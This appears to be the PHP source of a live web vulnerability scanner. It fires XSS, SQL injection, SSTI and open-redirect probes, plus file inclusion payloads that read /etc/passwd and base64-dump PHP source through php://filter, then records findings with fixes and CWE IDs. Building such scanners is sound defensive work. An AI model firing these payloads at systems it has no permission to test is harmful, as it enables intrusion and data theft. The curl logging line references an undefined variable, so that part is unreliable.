<?php
declare(strict_types=1);

/**
 * phprt attack runtime.
 *
 * Two modes:
 *   static  â€” the source rules (no target needed)
 *   live    â€” actually fires against a running URL, aggressively, then maps
 *             confirmed hits back to source lines when a matching root is given.
 *
 * Live attacks are ordered cheap-first and stop at the first proof of a class.
 * Every request is bounded (connect + total timeout, max body) so a broken
 * target cannot hang the run. Non-destructive by default; `read` payloads only.
 */

final class Http
{
    public int $requests = 0;
    public array $log = [];

    public function __construct(
        private string $base,
        private int $connectMs = 4000,
        private int $totalMs = 8000,
        private int $maxBody = 65536,
    ) {}

    public function get(string $path, array $headers = []): array
    {
        return $this->send('GET', $path, null, $headers);
    }

    public function post(string $path, string $body, array $headers = []): array
    {
        return $this->send('POST', $path, $body, $headers);
    }

    private function send(string $method, string $path, ?string $body, array $headers): array
    {
        $url = str_starts_with($path, 'http') ? $path : rtrim($this->base, '/') . $path;
        if (function_exists('curl_init')) {
            return $this->sendCurl($method, $url, $body, $headers);
        }
        return $this->sendStream($method, $url, $body, $headers);
    }

    private function sendStream(string $method, string $url, ?string $body, array $headers): array
    {
        $hdr = "User-Agent: phprt\r\n";
        foreach ($headers as $k => $v) {
            $hdr .= "$k: $v\r\n";
        }
        $ctx = stream_context_create(['http' => [
            'method' => $method,
            'header' => $hdr,
            'content' => $body ?? '',
            'timeout' => $this->totalMs / 1000,
            'ignore_errors' => true,
            'follow_location' => 0,
            'max_redirects' => 0,
        ]]);
        $raw = @file_get_contents($url, false, $ctx);
        $this->requests++;
        $head = '';
        $resp = is_string($raw) ? $raw : '';
        $code = 0;
        foreach ($http_response_header ?? [] as $line) {
            $head .= $line . "\r\n";
            if (preg_match('#^HTTP/\S+\s+(\d{3})#', $line, $m)) {
                $code = (int) $m[1];
            }
        }
        $resp = substr($resp, 0, $this->maxBody);
        $out = ['status' => $code, 'headers' => $head, 'body' => $resp, 'error' => $raw === false ? 'stream' : '', 'url' => $url];
        $this->log[] = sprintf('%-4s %s -> %s', $method, $url, $code ?: 'ERR');
        return $out;
    }

    private function sendCurl(string $method, string $url, ?string $body, array $headers): array
    {
        $ch = curl_init($url);
        $hdr = [];
        foreach ($headers as $k => $v) {
            $hdr[] = "$k: $v";
        }
        $opts = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_CONNECTTIMEOUT_MS => $this->connectMs,
            CURLOPT_TIMEOUT_MS => $this->totalMs,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_HTTPHEADER => $hdr,
            CURLOPT_USERAGENT => 'phprt/' . (defined('PHP_VERSION') ? '1' : '1'),
            CURLOPT_HEADER => true,
        ];
        if ($method === 'POST') {
            $opts[CURLOPT_POST] = true;
            $opts[CURLOPT_POSTFIELDS] = $body ?? '';
        }
        curl_setopt_array($ch, $opts);
        $raw = curl_exec($ch);
        $err = curl_error($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        $hsize = (int) curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        curl_close($ch);

        $this->requests++;
        $head = is_string($raw) ? substr($raw, 0, $hsize) : '';
        $resp = is_string($raw) ? substr($raw, $hsize, $this->maxBody) : '';
        $out = ['status' => $code, 'headers' => $head, 'body' => $resp, 'error' => $err, 'url' => $url];
        $this->log[] = sprintf('%-4s %s -> %s %s', $method, $path, $code ?: 'ERR', $err);
        return $out;
    }
}

final class Attack
{
    /** @var list<array{rule:string,severity:string,title:string,url:string,evidence:string,why:string,fix:string,cwe:string,confirmed:bool}> */
    public array $hits = [];
    public array $probes = [];

    public function __construct(private Http $http) {}

    private function record(string $rule, string $sev, string $title, string $url, array $why): array
    {
        $hit = [
            'rule' => $rule, 'severity' => $sev, 'title' => $title, 'url' => $url,
            'evidence' => '', 'why' => $why['why'], 'fix' => $why['fix'], 'cwe' => $why['cwe'],
            'confirmed' => false,
        ];
        $this->hits[] = $hit;
        return $hit;
    }

    /** Probe a param with a payload and return the response if the marker appears. */
    private function reflect(string $path, string $marker, string $body = '', string $method = 'GET'): ?array
    {
        $res = $method === 'POST'
            ? $this->http->post($path, $body)
            : $this->http->get($path);
        $this->probes[] = [$path, $method, $res['status']];
        return str_contains($res['body'], $marker) ? $res : null;
    }

    public function run(string $base): void
    {
        $base = rtrim($base, '/');

        // 1. Reflection: find which params echo back, aggressively.
        $reflected = $this->findReflection($base);

        // 2. XSS proof on the first reflecting param.
        if ($reflected !== []) {
            [$p, $sep] = $reflected[0];
            $mark = 'phprt' . bin2hex(random_bytes(4));
            $res = $this->reflected($base, $p, "<b>$mark</b>");
            if ($res !== null) {
                $h = $this->record('LIVE-XSS', 'medium', 'reflected XSS (live)',
                    "$base/?$p=<b>$mark</b>",
                    ['why' => 'The payload rendered unescaped in the response body - reflected XSS.',
                     'fix' => 'htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8") at the sink.',
                     'cwe' => 'CWE-79']);
                $this->hits[array_key_last($this->hits)]['confirmed'] = true;
                $this->hits[array_key_last($this->hits)]['evidence'] = $this->snip($res['body'], $mark);
            }

            // 3-5. Per-param class probes. The echo param proves XSS; every
            // reflected param is also tried for SQLi, LFI and SSTI, because the
            // sink is often not the one that reflects.
            foreach ($reflected as $i => [$p, $_sep]) {
                if ($i > 0) {
                    $this->sqlProbe($base, $p);
                    $this->lfiProbe($base, $p);
                    $this->sstiProbe($base, $p);
                }
            }
            [$p, $_sep] = $reflected[0];
            $this->sqlProbe($base, $p);
            $this->lfiProbe($base, $p);
            $this->sstiProbe($base, $p);

            // 6. open redirect on anything looking like a redirect param.
            $this->redirectProbe($base, $reflected);
        }

        // 7. Header-level checks, always.
        $this->headers($base);
    }

    /** @return list<array{0:string,1:string}> */
    private function findReflection(string $base): array
    {
        $names = ['q', 's', 'search', 'query', 'name', 'id', 'page', 'p', 'url', 'redirect',
            'next', 'return', 'view', 'file', 'path', 'cat', 'action', 'msg', 'email', 'debug'];
        $found = [];
        foreach (array_slice($names, 0, 10) as $n) {
            $mark = 'phprt' . bin2hex(random_bytes(3));
            $sep = '?';
            $res = $this->reflect("$base/?$n=$mark", $mark);
            if ($res !== null) {
                $found[] = [$n, $sep];
            }
        }
        return $found;
    }

    private function reflected(string $base, string $param, string $payload): ?array
    {
        $url = "$base/?" . $param . '=' . rawurlencode($payload);
        $res = $this->http->get($url);
        $this->probes[] = [$url, 'GET', $res['status']];
        return str_contains($res['body'], $payload) ? $res : null;
    }

    private function sqlProbe(string $base, string $p): void
    {
        // error-based first
        $err = ["'", "\"", "' OR '1'='1", "1)"];
        $signatures = ['You have an error in your SQL syntax', 'mysqli_fetch', 'SQLSTATE',
            'pg_query', 'unclosed quotation', 'SQLite3::'];
        foreach ($err as $payload) {
            $res = $this->http->get("$base/?" . $p . '=' . rawurlencode($payload));
            $this->probes[] = ["sqli$payload", 'GET', $res['status']];
            foreach ($signatures as $sig) {
                if (stripos($res['body'], $sig) !== false) {
                    $this->record('LIVE-SQLI', 'high', 'SQL injection (error-based, live)',
                        "$base/?$p=" . rawurlencode($payload),
                        ['why' => "Database error text appeared for payload $payload ($sig).",
                         'fix' => 'Prepared statements with bound parameters; cast LIMIT/ORDER BY.',
                         'cwe' => 'CWE-89']);
                    $this->hits[array_key_last($this->hits)]['confirmed'] = true;
                    $this->hits[array_key_last($this->hits)]['evidence'] = $sig;
                    return;
                }
            }
        }
    }

    private function lfiProbe(string $base, string $p): void
    {
        // Signatures must not be the payload text, or a reflecting app proves
        // itself. Use output-only markers, and send q empty so the include runs
        // without the search block in the way.
        $payloads = [
            ['../../../../etc/passwd', 'root:x:0:0', 'reader reached a POSIX passwd file'],
            ['/etc/passwd', 'root:x:0:0', 'reader accepted an absolute path'],
            ['php://filter/convert.base64-encode/resource=index.php', 'PD9waHA', 'php://filter returned base64 PHP source'],
            ['php://filter/convert.base64-encode/resource=index', 'PD9waHA', 'php://filter returned base64 PHP source'],
        ];
        foreach ($payloads as [$payload, $sig, $label]) {
            $res = $this->http->get("$base/?" . $p . '=' . rawurlencode($payload) . '&q=');
            $this->probes[] = ["lfi:$payload", 'GET', $res['status']];
            if (str_contains($res['body'], $sig) && !str_contains($res['body'], $payload)) {
                $this->record('LIVE-LFI', 'high', 'local file inclusion / traversal (live)',
                    "$base/?$p=" . rawurlencode($payload),
                    ['why' => "Payload $payload: $label.",
                     'fix' => 'basename() plus an allowlist, or a realpath() prefix check.',
                     'cwe' => 'CWE-98']);
                $this->hits[array_key_last($this->hits)]['confirmed'] = true;
                $this->hits[array_key_last($this->hits)]['evidence'] = $payload . ' -> ' . $label;
                return;
            }
        }
    }

    private function sstiProbe(string $base, string $p): void
    {
        // Require the expression to disappear AND a unique product to appear,
        // then re-confirm with a second product so an incidental "49" is ruled out.
        $cases = [['{{7*7}}', '49'], ['{{6*6}}', '36'], ['{{7*"7"}}', '49']];
        foreach ($cases as [$payload, $expect]) {
            $res = $this->http->get("$base/?" . $p . '=' . rawurlencode($payload) . '&q=');
            $this->probes[] = ["ssti:$payload", 'GET', $res['status']];
            if (str_contains($res['body'], $expect) && !str_contains($res['body'], $payload)) {
                $this->record('LIVE-SSTI', 'high', 'server-side template injection (live)',
                    "$base/?$p=" . rawurlencode($payload),
                    ['why' => "$payload evaluated to $expect and the expression itself did not echo.",
                     'fix' => 'Render a fixed template name with parameters, not a user template string.',
                     'cwe' => 'CWE-1336']);
                $this->hits[array_key_last($this->hits)]['confirmed'] = true;
                $this->hits[array_key_last($this->hits)]['evidence'] = "$payload -> $expect";
                return;
            }
        }
    }

    private function redirectProbe(string $base, array $reflected): void
    {
        $canary = 'https://phprt.example.com/x';
        foreach ($reflected as [$p, $_]) {
            if (!in_array($p, ['url', 'redirect', 'next', 'return', 'page'], true)) {
                continue;
            }
            $res = $this->http->get("$base/?" . $p . '=' . rawurlencode($canary));
            $this->probes[] = ["redirect:$p", 'GET', $res['status']];
            if (preg_match('/^location:\s*' . preg_quote($canary, '/') . '/im', $res['headers'])) {
                $this->record('LIVE-REDIRECT', 'high', 'open redirect (live)',
                    "$base/?$p=$canary",
                    ['why' => 'The Location header echoed the attacker host verbatim.',
                     'fix' => 'Validate the target against an allowlist, or use a safe_redirect helper.',
                     'cwe' => 'CWE-601']);
                $this->hits[array_key_last($this->hits)]['confirmed'] = true;
                $this->hits[array_key_last($this->hits)]['evidence'] = 'Location: ' . $canary;
                return;
            }
        }
    }

    private function headers(string $base): void
    {
        $res = $this->http->get($base . '/');
        $this->probes[] = ['headers', 'GET', $res['status']];
        $missing = [];
        foreach (['strict-transport-security', 'content-security-policy', 'x-frame-options',
            'x-content-type-options', 'referrer-policy'] as $h) {
            if (!preg_match('/^' . preg_quote($h, '/') . ':/im', $res['headers'])) {
                $missing[] = $h;
            }
        }
        if ($missing !== []) {
            $this->record('LIVE-HEADERS', 'low', 'missing security headers',
                $base . '/',
                ['why' => 'Absent: ' . implode(', ', $missing) . '.',
                 'fix' => 'Add HSTS, CSP, X-Frame-Options, X-Content-Type-Options and Referrer-Policy at the edge.',
                 'cwe' => 'CWE-693']);
            $this->hits[array_key_last($this->hits)]['evidence'] = implode(', ', $missing);
        }
        // server banner
        if (preg_match('/^(?:server|x-powered-by):\s*(.+)$/im', $res['headers'], $m)) {
            $this->hits[] = ['rule' => 'LIVE-BANNER', 'severity' => 'info',
                'title' => 'technology banner exposed', 'url' => $base . '/',
                'evidence' => trim($m[0]), 'why' => 'Version strings help an attacker pick exploits.',
                'fix' => 'Strip or genericise the Server / X-Powered-By headers.', 'cwe' => 'CWE-200',
                'confirmed' => true];
        }
    }

    private function snip(string $body, string $mark): string
    {
        $i = strpos($body, $mark);
        if ($i === false) {
            return '';
        }
        return trim(substr($body, max(0, $i - 40), 120));
    }
}
